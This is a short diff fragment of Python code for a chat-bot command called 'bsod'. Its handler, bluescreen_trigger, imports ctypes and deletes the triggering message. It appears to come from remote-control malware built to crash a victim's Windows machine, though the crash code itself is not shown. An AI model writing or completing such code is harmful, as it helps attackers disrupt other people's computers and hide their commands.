@@ -1,5 +1,5 @@
 import ctypes
-# end of imports
+
 @client.command(name="bsod")
 async def bluescreen_trigger(ctx): 
     await ctx.message.delete()
